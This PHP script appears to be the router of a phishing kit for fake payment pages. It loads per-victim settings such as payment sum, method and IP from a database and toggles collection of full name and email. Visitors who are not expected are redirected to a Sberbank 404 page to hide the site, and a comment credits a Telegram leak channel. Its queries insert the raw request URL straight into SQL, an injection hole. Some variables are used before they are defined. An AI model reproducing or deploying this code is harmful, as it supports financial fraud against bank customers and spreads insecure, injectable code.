<?php
define("access", "yes");
require_once 'admin/connection.php';
require_once $_SERVER["DOCUMENT_ROOT"] .'/config.php';


$url =  $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$test = explode('/',$link);

$getPage = R::load('settings', '1');
$acces = $getPage->landing_work;




$idPerson = generateRandomString();

//redirectAfterPay
$mysite = "https://www.google.com";

//активация полей (0-выкл\ 1вкл) https://t.me/slivmenss
$fio = 1; // Фамилия имя
$email = 0; // имейлы

if ($fio && $email) {$res = 1;}
else if (!$fio && $email) {	$res = 2;}	
else if ($fio && !$email) {	$res = 3;}

if (strlen($value) > 3){
	$value = substr($value, 0, -3). " " .substr($value, -3);
}



function generateRandomString($length = 10) {
    $characters = '0123456789';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}


$labirint = R::getAll( 'SELECT * FROM `path` WHERE `link` = "'.$url.'"');
$labirintCheck = count(R::getAll( 'SELECT * FROM `path` WHERE `link` = "'.$url.'"'));

if($acces){


    $PATH = R::getAll( 'SELECT * FROM `path`')[0];
    $itr = $PATH['x'];
    $ref =  $PATH['method'];
    $IP =   $PATH['ip'];
    $value = $PATH['sum'];
    $fraudCheckOn = intval($PATH['bc']);



	require 'main.php';
}
elseif ($labirintCheck) {

    $PATH = $labirint[0];
    $itr = $PATH['x'];
    $ref =  $PATH['method'];
    $IP =   $PATH['ip'];
    $value = $PATH['sum'];
    $fraudCheckOn = intval($PATH['bc']);
    require 'main.php';
}


else{
	echo "<script>window.location.replace('https://www.sberbank.ru/404.php');</script>";
}
?>